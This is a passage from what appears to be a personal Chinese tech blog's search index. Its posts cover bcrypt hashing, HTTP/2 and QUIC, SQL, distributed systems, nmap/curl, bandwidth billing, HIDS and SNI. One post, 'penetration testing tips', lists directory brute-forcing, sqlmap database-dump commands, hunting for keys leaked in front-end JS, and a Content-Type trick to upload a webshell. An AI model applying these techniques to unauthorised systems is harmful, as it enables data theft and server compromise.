dart\"><table><tr><td class=\"code\"><pre><span class=\"line\">salt = <span class=\"string\">'<span class=\"subst\">$2a</span><span class=\"subst\">$10</span>$'</span> + <span class=\"built_in\">String</span>(cryptojs.SHA256(<span class=\"string\">'Heyaff'</span> + username + password)).substring(<span class=\"number\">0</span>,<span class=\"number\">22</span>);</span><br></pre></td></tr></table></figure>\n<p>ii. 后端接收到bcrypt密文，执行SHA256加盐散列，后端盐值是在用户注册时随机生成的，并写入数据库，修改口令时会重新生成新的盐值<br>iii. 后端校验时，接收到前端的bcrypt密文，读取后端salt，执行SHA256(bcrypt,salt)与数据库比对。</p>\n<p>小技巧：<br>1、固定盐值，使用户的bcrypt每次都固定，同时也保证了不同用户不同盐值<br>2、前端盐值是可逆的，不能把口令明文写入salt，所以执行了SHA256散列并截取固定长度<br>3、传给后端的bcrypt既然是固定不变的，它也相当于“替代口令”，按传统意义的加盐散列存储即可<br>4、校验时，后端没有执行bcrypt算法</p>\n","categories":["bcrypt"],"tags":["bcrypt"]},{"title":"渗透测试技巧","url":"/2021/02/19/test/","content":"<h3 id=\"目录扫描爆破\"><a href=\"#目录扫描爆破\" class=\"headerlink\" title=\"目录扫描爆破\"></a>目录扫描爆破</h3><p>Dirsearch<br><code>python3 dirsearch.py -u https://xxx -x 403,404,401</code><br>可选：<br><code>-f -e php,html,jspx</code>，知道网站的应用架构后，限定扫描某后缀<br><code>--remove-extensions</code>，去掉字典中所有的后缀，探测子目录</p>\n<p><a href=\"https://github.com/maurosoria/dirsearch\">https://github.com/maurosoria/dirsearch</a><br>思路：爆破出一个目录后，继续对二级/三级目录进行爆破<a id=\"more\"></a></p>\n<h3 id=\"SQLMAP注入\"><a href=\"#SQLMAP注入\" class=\"headerlink\" title=\"SQLMAP注入\"></a>SQLMAP注入</h3><p>注入点位置，加*<font color='Blue'>（如果是BP手工测试，注入点位置是加’，看有无SQL报错信息）</font></p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"code\"><pre><span class=\"line\">--batch 不会询问你输入 全部默认确定</span><br><span class=\"line\">-v\tsql详细输出级别，等级<span class=\"number\">3</span>会显示payload</span><br><span class=\"line\"></span><br><span class=\"line\">python sqlmap<span class=\"selector-class\">.py</span> -r demo<span class=\"selector-class\">.txt</span> --dbs --batch -v <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">python sqlmap<span class=\"selector-class\">.py</span> -r demo<span class=\"selector-class\">.txt</span> --tables -D 库名</span><br><span class=\"line\"></span><br><span class=\"line\">python sqlmap<span class=\"selector-class\">.py</span> -r demo<span class=\"selector-class\">.txt</span> --<span class=\"attribute\">columns</span> -T 表名 -D 库名</span><br><span class=\"line\"></span><br><span class=\"line\">python sqlmap<span class=\"selector-class\">.py</span> -r demo<span class=\"selector-class\">.txt</span> --dump -C 列名<span class=\"number\">1</span>,列名<span class=\"number\">2</span> -T 表名 -D 库名</span><br><span class=\"line\"></span><br><span class=\"line\">python sqlmap<span class=\"selector-class\">.py</span> -r demo<span class=\"selector-class\">.txt</span> --dump-all -T 表名 -D 库名</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"前端VUE项目泄露未授权接口\"><a href=\"#前端VUE项目泄露未授权接口\" class=\"headerlink\" title=\"前端VUE项目泄露未授权接口\"></a>前端VUE项目泄露未授权接口</h3><p>Webpack所生成的js有他的命名规律，一般都为<code>xxx.随机字母数字.js</code>的两段式，且每一个JS文件具体内容均以<code>webpackJsonp</code>开始。</p>\n<hr>\n<p><strong>目标1：获取一个站点下所有的js文件</strong><br>工具①：burp<br>在Target标签下，选择站点，点进去右键<code>Copy selected URLs</code>，复制js script的全部URL<br>工具②：F12 控制台</p>\n<hr>\n<p><strong>目标2：提取js中隐藏的接口</strong><br>工具③：LinkFinder<br><code>python3 linkfinder.py -i https://xxx.com/js/xxx.min.js -o cli</code>，目前不支持批量查询，一条条查吧<br>工具④：JSFinder<br><code>python3 JSFinder.py -u https://xxx.com/js/xxx.min.js</code></p>\n<hr>\n<p>如果URL中有<font color=Blue>/#/</font>，基本是Webpack打包的，若出现SpringBoot的<strong>Whitelabel Error Page</strong>报错，尝试URL最后加个/</p>\n<h3 id=\"敏感信息泄露\"><a href=\"#敏感信息泄露\" class=\"headerlink\" title=\"敏感信息泄露\"></a>敏感信息泄露</h3><p>前端JS（如app.1.xxxxxx.js）中，不止隐藏的接口，可能还有OSS的密钥，AES的密钥（搜索encrypt）</p>\n<h3 id=\"泄露源代码\"><a href=\"#泄露源代码\" class=\"headerlink\" title=\"泄露源代码\"></a>泄露源代码</h3><p>在黑盒登录界面，找不到突破口的话，可以尝试在Github上搜索源代码，<font color=Blue>不要搜索中文注释或HTML中的代码</font>，尽量去看/scripts/xxx.js中源码，如某函数中“/api/server/getkey_pc”，在GitHub上搜<code>getkey_pc</code>关键词，找出类似源代码，找出供应商etc.</p>\n<h3 id=\"上传Webshell\"><a href=\"#上传Webshell\" class=\"headerlink\" title=\"上传Webshell\"></a>上传Webshell</h3><p>比如将php文件的<code>Content-Type:application/octet-stream</code>改为</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"code\"><pre><span class=\"line\">Content-<span class=\"keyword\">Type</span>: <span class=\"type\">text</span>/html</span><br><span class=\"line\">Content-<span class=\"keyword\">Type</span>: image/png</span><br><span class=\"line\">Content-<span class=\"keyword\">Type</span>: <span class=\"type\">text</span>/<span class=\"type\">xml</span></span><br></pre></td></tr></table></figure>\n<p>来绕过服务器白名单限制，实现上传webshell</p>\n","categories":["渗透测试"],"tags":["渗透工具"]},{"title":"HTTP/2 & QUIC 协议","url":"/2021/01/08/http2/","content":"<h3 id=\"HTTP-2对比HTTP-1-1\"><a href=\"#HTTP-2对比HTTP-1-1\" class=\"headerlink\" title=\"HTTP/2对比HTTP 1.1\"></a>HTTP/2对比HTTP 1.1</h3><p>HTTP/2也被称为HTTP 2.0，相对于HTTP 1.1的新增多路复用、压缩HTTP头、划分请求优先级、服务端推送等特性，解决了在HTTP 1.1中一直存在的问题，优化了请求性能，同时兼容了HTTP 1.1的语义。<a id=\"more\"></a></p>\n<h3 id=\"HTTP-2优势\"><a href=\"#HTTP-2优势\" class=\"headerlink\" title=\"HTTP/2优势\"></a>HTTP/2优势</h3><ul>\n<li>二进制协议：相比于HTTP 1.x基于文本的解析，HTTP/2将所有的传输信息分割为更小的消息和帧，并对它们采用二进制格式编码。基于二进制可以使协议有更多的扩展性，例如，引入帧来传输数据和指令。</li>\n<li>内容安全：HTTP/2基于HTTPS，具有安全特性。使用HTTP/2特性可以避免单纯使用HTTPS引起的性能下降问题。</li>\n<li>多路复用（MultiPlexing）：通过该功能，在一条连接上，您的浏览器可以同时发起无数个请求，并且响应可以同时返回。另外，多路复用中支持了流的优先级（Stream dependencies）设置，允许客户端告知服务器最优资源，可以优先传输。</li>\n<li>Header压缩（Header compression）：HTTP请求头带有大量信息，而且每次都要重复发送。HTTP/2采用HPACK格式进行压缩传输，通讯双方各自缓存一份头域索引表，相同的消息头只发送索引号，从而提高效率和速度。</li>\n</ul>\n<h3 id=\"HTTP的访问请求只能是HTTP-1-1，HTTPS下才会有H2\"><a href=\"#HTTP的访问请求只能是HTTP-1-1，HTTPS下才会有H2\" class=\"headerlink\" title=\"HTTP的访问请求只能是HTTP/1.1，HTTPS下才会有H2\"></a>HTTP的访问请求只能是HTTP/1.1，HTTPS下才会有H2</h3><h3 id=\"Nginx支持H2配置，但不支持后端应用也启用了H2\"><a href=\"#Nginx支持H2配置，但不支持后端应用也启用了H2\" class=\"headerlink\" title=\"Nginx支持H2配置，但不支持后端应用也启用了H2\"></a>Nginx支持H2配置，但不支持后端应用也启用了H2</h3><figure class=\"highlight nginx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">　　 <span class=\"attribute\">listen</span> <span class=\"number\">80</span>;</span><br><span class=\"line\">　　 <span class=\"attribute\">listen</span> [::]:<span class=\"number\">80</span>;</span><br><span class=\"line\">　　 <span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl http2;</span><br><span class=\"line\">　　 <span class=\"attribute\">listen</span> [::]:<span class=\"number\">443</span> ssl http2;</span><br><span class=\"line\">　　 <span class=\"attribute\">server_name</span> example.com;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"为啥抓包工具抓不到HTTP-2\"><a href=\"#为啥抓包工具抓不到HTTP-2\" class=\"headerlink\" title=\"为啥抓包工具抓不到HTTP/2\"></a>为啥抓包工具抓不到HTTP/2</h3><p>BURP_2020.6版本之后支持HTTP/2</p>\n<h3 id=\"QUIC基于UDP协议，属于传输层\"><a href=\"#QUIC基于UDP协议，属于传输层\" class=\"headerlink\" title=\"QUIC基于UDP协议，属于传输层\"></a>QUIC基于UDP协议，属于传输层</h3><ul>\n<li>1RTT/0RTT</li>\n<li>QUIC的1个RTT就是用来获取服务端的公钥，缓存到客户端，后续0-RTT</li>\n<li>TLS1.3传输层安全协议</li>\n<li>连接迁移，使用UUID标识每一次连接，当手机切换网络，自身IP变化的场景，对于TCP连接（源目IP+源目端口）就会失效，需重新建立连接。但只要UUID不变，QUIC就不需要重新握手，继续传输数据</li>\n</ul>\n<h3 id=\"QUIC缺点\"><a href=\"#QUIC缺点\" class=\"headerlink\" title=\"QUIC缺点\"></a>QUIC缺点</h3><ul>\n<li>推广慢，运营商/公司一般会对53端口（DNS）以外的UDP流量拦截或限流</li>\n<li>UDP放大攻击，攻击者控制肉机向受害者投放大量的UDP流量</li>\n</ul>\n<h3 id=\"HTTP-3，基于QUIC协议的HTTP（HTTP-over-QUIC）命名为HTTP-3\"><a href=\"#HTTP-3，基于QUIC协议的HTTP（HTTP-over-QUIC）命名为HTTP-3\" class=\"headerlink\" title=\"HTTP/3，基于QUIC协议的HTTP（HTTP-over-QUIC）命名为HTTP/3\"></a>HTTP/3，基于QUIC协议的HTTP（HTTP-over-QUIC）命名为HTTP/3</h3><p>QUIC协议不止用于HTTP，也可用于其他</p>\n<h3 id=\"客户端开启HTTP-3\"><a href=\"#客户端开启HTTP-3\" class=\"headerlink\" title=\"客户端开启HTTP/3\"></a>客户端开启HTTP/3</h3><p>最新版Chrome 83+、Firefox 75+已支持QUIC，但是都需要手动开启，主要原因HTTP/3还在草案阶段</p>\n<ul>\n<li>Firefox——<code>about:config</code>中network.http.http3.enabled = true</li>\n<li>Chrome——<code>chrome://flags</code>中enable-quic</li>\n</ul>\n<p>步骤一：关闭当前Chrome<br>步骤二：在电脑命令行下启动Chrome<br>Windows 环境：C:\\Program Files (x86)\\Google\\Chrome\\Application&gt;chrome.exe –enable-quic –quic-version=h3-29</p>\n<p>macOS 环境 ：/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome –enable-quic –quic-version=h3-29</p>\n","categories":["QUIC"],"tags":["HTTP/2"]},{"title":"SQL语句","url":"/2021/01/04/sql/","content":"<h3 id=\"SQL计算累计和-sum-over\"><a href=\"#SQL计算累计和-sum-over\" class=\"headerlink\" title=\"SQL计算累计和 sum() over\"></a><a href=\"https://www.cnblogs.com/mingdashu/p/12100734.html\">SQL计算累计和 sum() over</a></h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">累计求和sum() over(order by 其他列名1,其他列名2...)</span><br><span class=\"line\"></span><br><span class=\"line\">sum(计数的列名) over()\t\t\t统计所有行数，计算求和</span><br><span class=\"line\"></span><br><span class=\"line\">sum(计数的列名) over(order by 列名1)\t根据列名1，order by排序后的总和</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n\n<h3 id=\"一个SQL片段\"><a href=\"#一个SQL片段\" class=\"headerlink\" title=\"一个SQL片段\"></a>一个SQL片段</h3><p>with <em>别名</em> as (select * from table)</p>\n<h3 id=\"多个片段\"><a href=\"#多个片段\" class=\"headerlink\" title=\"多个片段\"></a>多个片段</h3><p>with <em>别名1</em> as (<br>    xxxx<br>),<br><em>别名2</em> as(<br>    xxxx<br>)</p>\n<h3 id=\"时间-日期\"><a href=\"#时间-日期\" class=\"headerlink\" title=\"时间/日期\"></a>时间/日期</h3><figure class=\"highlight pgsql\"><table><tr><td class=\"code\"><pre><span class=\"line\">+ <span class=\"type\">interval</span> <span class=\"string\">'1 day'</span>\t\t\t<span class=\"comment\">----加减1天</span></span><br><span class=\"line\"></span><br><span class=\"line\">列名::<span class=\"type\">timestamp</span>\t\t\t\t<span class=\"comment\">----转成timestamp格式</span></span><br><span class=\"line\">CAST(列名 <span class=\"keyword\">as</span> <span class=\"type\">timestamp</span>)\t\t\t<span class=\"comment\">----转成timestamp格式</span></span><br><span class=\"line\"></span><br><span class=\"line\">date_trunc(<span class=\"string\">'week'</span>,列名)\t\t\t<span class=\"comment\">----列名类型timestamp，返回每年/每月的第一天，每周的星期一</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> date_trunc(<span class=\"string\">'week'</span>,create_time),count(列名) <span class=\"keyword\">FROM</span> 表名 <span class=\"keyword\">GROUP</span> <span class=\"keyword\">BY</span> date_trunc(<span class=\"string\">'week'</span>,create_time)\t\t<span class=\"comment\">----统计每周的数据量</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">to_char(列名,<span class=\"string\">'YYYY-MM-DD'</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"拼接字段\"><a href=\"#拼接字段\" class=\"headerlink\" title=\"拼接字段\"></a>拼接字段</h3><p>CONCAT(‘工号为:’,列名,’的员工’,count(xxx))</p>\n","categories":["SQL"],"tags":["统计报表"]},{"title":"分布式系统技术栈","url":"/2020/12/31/jishu/","content":"<p><a href=\"https://www.cnblogs.com/xybaby/p/7787034.html\">什么是分布式系统，如何学习分布式系统</a><br>抛出问题：<br>一个对外提供服务的大型分布式系统，用户访问这个系统，做一些操作，产生需要存储的数据，在这个过程中，有哪些组件、协议和调用？<a id=\"more\"></a></p>\n<p><strong>请求</strong><br>Web浏览器、APP客户端、SDK组件</p>\n<p><strong>负载均衡</strong><br>在分布式系统中，为了高并发、高可用，一般是多个节点服务器提供相同的服务，由load balance选择哪个节点来提供服务</p>\n<p><strong>系统调用</strong><br>节点服务器开始处理用户的请求，简单请求，可能是有缓存的，即分布式缓存。如果缓存没有，那么去数据库拉取数据。<br>复杂请求，即系统A需要调用系统B的服务，但是，每个应用都手写socket是一件冗杂、低效的事情，因此需要应用层的封装，因此有了HTTP接口。如果系统愈加复杂，大量的HTTP接口也是一件困难的事情，因此进一步的抽象，就是RPC（remote produce call），远程调用就跟本地过程调用一样方便，屏蔽了网络通信等诸多细节(一般公司使用dubbo框架实现RPC远程调用)。</p>\n<p>总结：socket—–HTTP接口—–RPC</p>\n<p><strong>注册中心</strong><br>一个请求包含多个操作，其实就是涉及到多个服务，分布式系统中有大量的服务，每个服务又是多个节点组成。那么一个服务怎么找到另一个服务（的某个节点呢）？<br>通信是需要地址的，怎么获取这个地址，最简单的办法就是配置文件写死，或者写入到数据库，但这些方法在节点数据巨大、节点动态增删的时候都不大方便，这个时候就需要服务注册与发现：提供服务的节点向一个协调中心注册自己的地址，使用服务的节点去协调中心拉取地址。</p>\n<p>从上可以看见，协调中心提供了中心化的服务：以一组节点提供类似单点的服务，使用非常广泛，比如命令服务、分布式锁。协调中心最出名的就是zookeeper，chubby。</p>\n<p><strong>消息队列</strong><br>回到用户请求这个点，请求操作会产生一些数据、日志，其他一些系统可能会对这些消息感兴趣，比如个性化推荐、监控等，这里就抽象出了两个概念，消息的生产者与消费者。那么生产者怎么将消息发送给消费者呢，RPC并不是一个很好的选择，因为RPC肯定得指定消息发给谁，但实际的情况是生产者并不清楚、也不关心谁会消费这个消息，这个时候消息队列就出马了。简单来说，生产者只用往消息队列里面发就行了，队列会将消息按主题（topic）分发给关注这个主题的消费者。消息队列起到了异步处理、应用解耦的作用。</p>\n<p><strong>分布式计算</strong><br>上面提到，用户操作会产生一些数据，这些数据忠实记录了用户的操作习惯、喜好，是各行各业最宝贵的财富。比如各种推荐、广告投放、自动识别。这就催生了分布式计算平台，比如Hadoop，Storm等，用来处理这些海量的数据。</p>\n<p><strong>分布式存储</strong><br>最后，用户的操作完成之后，用户的数据需要持久化，但数据量很大，大到按个节点无法存储，那么这个时候就需要分布式存储：将数据进行划分放在不同的节点上，同时，为了防止数据的丢失，每一份数据会保存多分。传统的关系型数据库是单点存储，为了在应用层透明的情况下分库分表，会引用额外的代理层。而对于NoSql，一般天然支持分布式。</p>\n<p><img src=\"/images/fenbushi.png\" alt=\"分布式架构图\"></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">组件</th>\n<th align=\"center\">技术栈</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">负载均衡</td>\n<td align=\"center\">Nginx</td>\n<td align=\"center\">负载均衡、反向代理、静态内容缓存，工作在应用层</td>\n</tr>\n<tr>\n<td align=\"center\">负载均衡</td>\n<td align=\"center\">LVS</td>\n<td align=\"center\">高性能、高可用的服务器，工作在网络层</td>\n</tr>\n<tr>\n<td align=\"center\">WEB server</td>\n<td align=\"center\">Java：Tomcat、Apache、Jboss、Weblogic</td>\n<td align=\"center\">Weblogic收费</td>\n</tr>\n<tr>\n<td align=\"center\">service</td>\n<td align=\"center\">SOA</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">service</td>\n<td align=\"center\">微服务</td>\n<td align=\"center\">主要是后端服务拆分</td>\n</tr>\n<tr>\n<td align=\"center\">service</td>\n<td align=\"center\">spring boot</td>\n<td align=\"center\">后端</td>\n</tr>\n<tr>\n<td align=\"center\">service</td>\n<td align=\"center\">django</td>\n<td align=\"center\">后端</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td align=\"center\">VUE</td>\n<td align=\"center\">前端</td>\n</tr>\n<tr>\n<td align=\"center\">容器</td>\n<td align=\"center\">docker</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">容器</td>\n<td align=\"center\">k8s</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">cache</td>\n<td align=\"center\">memchache</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">cache</td>\n<td align=\"center\">redis</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">协调中心</td>\n<td align=\"center\">zookeeper</td>\n<td align=\"center\">java开发的，被Apache很多项目采用</td>\n</tr>\n<tr>\n<td align=\"center\">协调中心</td>\n<td align=\"center\">etcd</td>\n<td align=\"center\">在分布式环境下的key/value存储服务，用于共享配置信息或服务发现，主要是被K8s采用</td>\n</tr>\n<tr>\n<td align=\"center\">RPC框架</td>\n<td align=\"center\">dubbo</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">消息队列</td>\n<td align=\"center\">kafka</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">消息队列</td>\n<td align=\"center\">rabbitMQ</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">消息队列</td>\n<td align=\"center\">rocketMQ</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">实时数据</td>\n<td align=\"center\">storm</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">离线数据平台</td>\n<td align=\"center\">Hadoop</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">离线数据平台</td>\n<td align=\"center\">spark</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">dbproxy</td>\n<td align=\"center\">cobar</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DB</td>\n<td align=\"center\">MySQL、Oracle、MongoDB、HBase</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">搜索</td>\n<td align=\"center\">elasticsearch</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">日志</td>\n<td align=\"center\">rsyslog</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">日志</td>\n<td align=\"center\">elk</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">日志</td>\n<td align=\"center\">flume</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<p>Kafka-ZooKeeper分布式消息队列系统架构：<br><img src=\"/images/kafka-zk.png\" alt=\"分布式架构图\"></p>\n","categories":["技术栈"],"tags":["分布式系统"]},{"title":"nmap及linux命令","url":"/2020/12/29/nmap/","content":"<h3 id=\"PN-No-ping扫描\"><a href=\"#PN-No-ping扫描\" class=\"headerlink\" title=\"PN No ping扫描\"></a>PN No ping扫描</h3><p>如果远程主机有防火墙IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会禁用ping<br>禁ping，TCP端口扫描命令：<br><code>nmap -sT -Pn 目标IP</code></p>\n<h3 id=\"CURL命令\"><a href=\"#CURL命令\" class=\"headerlink\" title=\"CURL命令\"></a>CURL命令<a id=\"more\"></a></h3><ul>\n<li>添加请求头<figure class=\"highlight livescript\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -X GET <span class=\"string\">\"https://xxx.com\"</span> <span class=\"string\">\\</span></span><br><span class=\"line\">     -H <span class=\"string\">\"Cookie: xxx\"</span> <span class=\"string\">\\</span></span><br><span class=\"line\">     -H <span class=\"string\">\"Referer: https://xxx.com:1111/xxx\"</span></span><br></pre></td></tr></table></figure></li>\n<li>POST添加请求body -d<br><code>curl https://xxx.com -X POST -d &#39;id=1&amp;user=hehe&#39;</code></li>\n</ul>\n<h3 id=\"Linux下awk命令\"><a href=\"#Linux下awk命令\" class=\"headerlink\" title=\"Linux下awk命令\"></a>Linux下awk命令</h3><p>用来截取文本中的片段，类似excel的分列</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#使用多个分隔符.先使用空格分割，然后对分割结果再使用\",\"分割，输出第1 2 5列</span></span><br><span class=\"line\">awk -F <span class=\"string\">'[ ,]'</span>  <span class=\"string\">'&#123;print $1,$2,$5&#125;'</span>   log.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#使用\",\"分列后，统计第7 9列出现的次数，输出最多的TOP 10</span></span><br><span class=\"line\">cat log.txt | awk -F <span class=\"string\">','</span> <span class=\"string\">'&#123;print $7,$9&#125;'</span> | sort | uniq -c | sort -k1nr | head <span class=\"number\">-10</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","categories":["nmap","curl","awk"],"tags":["端口扫描","curl"]},{"title":"流量&带宽","url":"/2020/12/08/flow/","content":"<h3 id=\"云服务器10Mb带宽，假如一个月天天全部跑满，那跑的流量大约是-10M-8-一个月的秒数-≈3TB\"><a href=\"#云服务器10Mb带宽，假如一个月天天全部跑满，那跑的流量大约是-10M-8-一个月的秒数-≈3TB\" class=\"headerlink\" title=\"云服务器10Mb带宽，假如一个月天天全部跑满，那跑的流量大约是 10M/8*(一个月的秒数)≈3TB\"></a>云服务器10Mb带宽，假如一个月天天全部跑满，那跑的流量大约是 10M/8*(一个月的秒数)≈3TB</h3><p>实际上，大部分时间是跑不满甚至大部分带宽是闲置的。<br>计算方法：10M带宽下载速度峰值为1280KB/S，一天是86400秒，那么一天产生的公网出流量大小为105GB左右，计算方法如下：</p>\n<p>1280KB/S * 86400 = 110592000KB = 108000MB = 105.5GB<a id=\"more\"></a></p>\n<h3 id=\"带宽是小b，流量是大B。普通用户下载接触的是流量（大B）\"><a href=\"#带宽是小b，流量是大B。普通用户下载接触的是流量（大B）\" class=\"headerlink\" title=\"带宽是小b，流量是大B。普通用户下载接触的是流量（大B）\"></a>带宽是小b，流量是大B。普通用户下载接触的是流量（大B）</h3><h3 id=\"机房、运营商收费：进-出流量取较大的值，只收一个方向的钱，是按峰值带宽跟你收费的\"><a href=\"#机房、运营商收费：进-出流量取较大的值，只收一个方向的钱，是按峰值带宽跟你收费的\" class=\"headerlink\" title=\"机房、运营商收费：进/出流量取较大的值，只收一个方向的钱，是按峰值带宽跟你收费的\"></a>机房、运营商收费：进/出流量取较大的值，只收一个方向的钱，是按峰值带宽跟你收费的</h3><p>机房收费标准：假如机房访问峰值（可能就持续不到半个小时）超过 50G，为了保证用户体验，那必须升级带宽（不升级就会被限速、高峰期丢包），升级带宽当然是加钱了（账单会让你热泪盈眶）。</p>\n<h3 id=\"阿里云、华为云等收费：只收出云的流量-带宽，入云的不收费。\"><a href=\"#阿里云、华为云等收费：只收出云的流量-带宽，入云的不收费。\" class=\"headerlink\" title=\"阿里云、华为云等收费：只收出云的流量/带宽，入云的不收费。\"></a>阿里云、华为云等收费：只收出云的流量/带宽，入云的不收费。</h3><p>流量流入云服务器是免费的（如：用户上传流量是免费的），流量流出云服务器是收费的。<br>阿里云服务器流量收费只统计公网出方向的流量，内网流量不收费，用户上传文件到服务器产生的流量也是不计入收费的。</p>\n<h3 id=\"流量收费\"><a href=\"#流量收费\" class=\"headerlink\" title=\"流量收费\"></a>流量收费</h3><p>流量少建议按流量计算，也适用于流量波动较大的应用场景<br>优点：防止突然爆发的流量产生较高费用，推荐小客户<br>缺点：<br>1、CC类的流量攻击，也算费用<br>2、不承诺带宽，流量计费套餐也是有一个带宽峰值的，并不是无限制。有这个带宽峰值，业务就可能会受到限制</p>\n<h3 id=\"带宽收费\"><a href=\"#带宽收费\" class=\"headerlink\" title=\"带宽收费\"></a>带宽收费</h3><p>适用于业务场景对于网络带宽要求比较稳定的客户<br>优点：独享带宽给到用户，无论带宽是否有有流量，流量是否跑满，都需要付费，推荐大客户<br>缺点：</p>\n<h3 id=\"所以使用流量计费模式可以以更低的价格撬动更大的带宽值，但是如果流量太大，也会产生较高的流量费用\"><a href=\"#所以使用流量计费模式可以以更低的价格撬动更大的带宽值，但是如果流量太大，也会产生较高的流量费用\" class=\"headerlink\" title=\"所以使用流量计费模式可以以更低的价格撬动更大的带宽值，但是如果流量太大，也会产生较高的流量费用\"></a>所以使用流量计费模式可以以更低的价格撬动更大的带宽值，但是如果流量太大，也会产生较高的流量费用</h3>","categories":["带宽"],"tags":["流量"]},{"title":"HIDS工作点","url":"/2020/11/30/hids/","content":"<h3 id=\"HIDS干啥用的\"><a href=\"#HIDS干啥用的\" class=\"headerlink\" title=\"HIDS干啥用的\"></a>HIDS干啥用的</h3><p>管理资产/脆弱性/主机状态/合规基线检测<br>webshell检测<br>弱口令检测<br>登录异常检测<br>反弹shell检测<br>后门检测<a id=\"more\"></a><br>本地提权检测<br>挖矿、勒索检测<br>主机漏洞管理<br>开放端口检测</p>\n<p>恶意文件/程序/木马/病毒检测（特征+沙箱技术，在本地检测or传到服务端检测）</p>\n<h3 id=\"业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件-病毒\"><a href=\"#业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件-病毒\" class=\"headerlink\" title=\"业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件/病毒\"></a>业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件/病毒</h3><p>HIDS告警信息的聚合 是必须的<br>经验来说，检测出的木马/病毒较少</p>\n<h3 id=\"Cgroup问题\"><a href=\"#Cgroup问题\" class=\"headerlink\" title=\"Cgroup问题\"></a>Cgroup问题</h3><p>cgroup强制限制硬件资源，如CPU、内存、设备和网络。<br>轻量级agent基于cgroup实现资源限制<br>Agent进程资源限制的Cgroup，触发几次CentOS7.2的内核Bug，导致机器不断重启</p>\n","categories":["HIDS"],"tags":["HIDS"]},{"title":"SNI","url":"/2020/11/30/sni/","content":"<ul>\n<li><a href=\"https://wwww.lvmoo.com/933.love\" title=\"凯の秘密基地\">浅谈SNI兼容性导致HTTPS出错问题</a></li>\n<li><a href=\"https://bbs.appnode.com/thread-877.htm\">为什么SSL测试结果会显示两个RSA证书？</a></li>\n</ul>\n<h3 id=\"SNI背景介绍\"><a href=\"#SNI背景介绍\" class=\"headerlink\" title=\"SNI背景介绍\"></a>SNI背景介绍</h3><p><strong>SNI</strong> (Server Name Indication)主要解决一台服务器只能使用一个证书(一个域名)的缺点，随着服务器对虚拟主机的支持，一个服务器上可以为多个域名提供服务。有 SNI 机制后，可以在同一个IP 下绑定多个证书，但是客户端在请求时需要先带上域名，这样服务端才能找到对应的 SSL 证书，因此SNI必须得到支持才能满足需求<a id=\"more\"></a><br><img src=\"/images/SNI-1.png\" alt=\"支持SNI的客户端获取到的server证书\"><br><img src=\"/images/SNI-2.png\" alt=\"不支持SNI的客户端获取到的server证书\"></p>\n<h3 id=\"命令行测试\"><a href=\"#命令行测试\" class=\"headerlink\" title=\"命令行测试\"></a>命令行测试</h3><p>模拟支持SNI的浏览器获取到的证书，使用以下命令测试：<br><code>openssl s_client -connect www.appnode.com:443 -servername www.appnode.com -showcerts</code></p>\n<p>模拟不支持SNI的浏览器获取到的证书，使用以下命令测试：<br><code>openssl s_client -connect www.appnode.com:443 -showcerts</code></p>\n<h3 id=\"对于不支持-SNI-的客户端\"><a href=\"#对于不支持-SNI-的客户端\" class=\"headerlink\" title=\"对于不支持 SNI 的客户端\"></a>对于不支持 SNI 的客户端</h3><ul>\n<li>建议客户端升级或使用新版本的浏览器（如Chrome、Firefox等）</li>\n<li>如果是微信、支付宝第三方回调，需要让其调用源站IP，绕过Web应用防火墙</li>\n</ul>\n","categories":["SNI"],"tags":["SNI"]},{"title":"WAF安全运营","url":"/2020/11/12/waf/","content":"<ul>\n<li><a href=\"https://mp.weixin.qq.com/s/BiH23k7xAeuwb5wwaOEKVw\" title=\"安全研究与实践\">体系化的WAF安全运营实践</a></li>\n</ul>\n<h3 id=\"WAF指标\"><a href=\"#WAF指标\" class=\"headerlink\" 